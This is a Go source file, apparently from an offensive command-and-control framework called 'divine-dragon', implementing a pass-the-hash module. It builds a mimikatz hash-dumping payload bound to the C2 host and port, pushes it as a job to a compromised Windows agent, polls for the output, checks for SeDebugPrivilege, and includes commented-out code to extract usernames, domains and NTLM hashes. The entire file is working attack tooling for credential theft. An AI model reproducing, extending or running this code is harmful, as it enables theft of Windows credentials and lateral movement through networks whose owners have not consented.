package local_exploit

import (
	"divine-dragon/c2"
	"divine-dragon/payload_generator"
	"divine-dragon/util"
	"strings"
	"time"
)

type PassTheHashModule struct {
	c2m       *c2.C2Module
	agentUuid string
	logger    util.Logger
}

func NewPassTheHashModule(c2mOpt *c2.C2Module, agentUuidOpt string) *PassTheHashModule {
	pthm := PassTheHashModule{
		c2m:       c2mOpt,
		agentUuid: agentUuidOpt,
	}
	pthm.logger = util.PassTheHashLogger(true, "")
	return &pthm
}

func (pthm *PassTheHashModule) Run() {
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(pthm.c2m.GetC2Hostname(), pthm.c2m.GetC2Port(), "mimikatz_hashdump", "windows", "amd64", "mimikatz_hashdump.exe")
	stpgm.Run()

	jobUuid, err := pthm.c2m.AddJob(pthm.agentUuid, "mimikatz_hashdump.exe")
	if err != nil {
		pthm.logger.Log.Error(err)
		return
	}
	pthm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = pthm.c2m.GetAllAgentJobs(pthm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		pthm.logger.Log.Info("Sleeping for 5 sec...")
		time.Sleep(time.Second * 5)
	}
	if !statuses[jobUuid] {
		pthm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
		return
	} else {
		pthm.logger.Log.Noticef("Job executed fine. Parsing the results...")
		if strings.Compare(results[jobUuid], "Job hasn't returned some output. But it seems ok.") == 0 {
			pthm.logger.Log.Info("Job executed fine, but it has no results. Stopping...")
			return
		} else {
			pthm.logger.Log.Info("Checking SeDebugPrivilege token...")
			if strings.Contains(results[jobUuid], "Privilege '20' OK") {
				pthm.logger.Log.Notice("SeDebugPrivilege is set.")
				// NEED A BETTER PARSER AND MOVE IT TO OTHER METHOD
				// splittedResult := strings.Split(results[jobUuid], "Authentication Id")
				// usernames := []string{}
				// domains := []string{}
				// for _, line := range splittedResult {
				// 	fmt.Println("=======================================================================")
				// 	for _, subline := range strings.Split(line, "\r\n") {
				// 		fmt.Println("---------------")
				// 		var tmpUsername string
				// 		var tmpDomain string
				// 		if strings.Contains(subline, "Username") {
				// 			tmpUsername = strings.Split(subline, ":")[1]
				// 		}
				// 		if strings.Contains(subline, "Domain") {
				// 			tmpDomain = strings.Split(subline, ":")[1]
				// 		}
				// 		if strings.Contains(subline, "NTLM") {
				// 		}
				// 		usernames = append(usernames, tmpUsername)
				// 		domains = append(domains, tmpDomain)
				// 	}
				// }
			} else {
				pthm.logger.Log.Error("Agent is running as user without SeDebugPrivilege.")
			}
		}
	}
}
